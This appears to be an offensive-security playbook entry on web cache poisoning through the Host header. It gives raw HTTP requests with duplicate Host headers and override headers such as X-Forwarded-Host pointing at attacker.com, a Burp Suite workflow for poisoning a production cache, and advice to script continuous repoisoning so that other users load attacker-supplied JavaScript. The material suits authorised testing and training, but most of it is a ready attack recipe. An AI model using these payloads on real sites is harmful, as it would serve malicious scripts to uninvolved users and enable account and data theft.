# Host Header — Web Cache Poisoning

## When this applies

- Cache key omits the Host header (single shared cache for multiple vhosts).
- App reflects Host into `<script src=>`, `<link href=>`, or `Location:` redirect.
- Goal: poison the cache so other users execute attacker-supplied JS.

## Technique

Add a duplicate Host header (or X-Forwarded-Host) and verify reflection. Use cache-buster during testing. Once the response is cached with the malicious value, remove the buster.

## Steps

### Indicators

- Caching headers present (X-Cache, Age, Cache-Control)
- Host header reflected in response
- Script/resource imports use absolute URLs

### Test with cache-buster

```http
# Use cache busters during testing
GET /?cb=random-value HTTP/1.1
Host: legitimate-domain.com
Host: attacker.com
```

### Exploitation

```
1. Create malicious resource on attacker server
2. Poison cache with duplicate Host headers
3. Remove cache buster for production exploitation
```

### Burp Suite cache-poisoning workflow

```
1. Identify cacheable endpoint
2. Add cache buster: GET /?cb=123
3. Send to Repeater
4. Add duplicate Host header
5. Create malicious resource on exploit server
6. Send until X-Cache: hit
7. Remove cache buster
8. Repeat to poison production cache
```

### Duplicate Host headers

```http
GET /?cb=123 HTTP/1.1
Host: legitimate-domain.com
Host: attacker.com
```

### Override headers

```http
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
```

### Vulnerable indicators in response

```http
# Vulnerable cache configuration
X-Cache: hit
Cache-Control: public, max-age=3600
Vary: Accept-Encoding (Host NOT in Vary)

# Vulnerable redirects
Location: https://{HOST_HEADER}/path

# CORS reflection
Access-Control-Allow-Origin: https://{HOST_HEADER}
```

### Header priority (common configurations)

| Priority | Header | Purpose |
|----------|--------|---------|
| 1 | X-Forwarded-Host | Proxy/CDN override |
| 2 | X-Host | Alternative override |
| 3 | Host | Standard HTTP header |
| 4 | Forwarded | RFC 7239 standard |

### Validation

```
1. Send request to Repeater
2. Burp menu > Burp Collaborator client
3. Copy Collaborator payload
4. Modify Host header to Collaborator domain
5. Send request
6. Poll Collaborator for interactions
7. Confirms SSRF capability
```

## Verifying success

- Reflection: spoofed Host appears in response body (e.g., `<script src="//attacker.com/...">`).
- Cache hit: subsequent request without cache-buster returns the poisoned response.
- Different session (no cookies) hitting the same URL receives the poisoned response.

## Common pitfalls

- `Set-Cookie` in response often disables caching — pick endpoints that don't set cookies.
- Cache TTL may be short — script continuous repoisoning.
- Some apps validate Host against a whitelist before reflecting — try X-Forwarded-Host.

## Tools

- Burp Suite Repeater + Param Miner (find unkeyed Host-like inputs)
- Burp Turbo Intruder (continuous poisoning)
- Burp Collaborator (validate SSRF dimension)
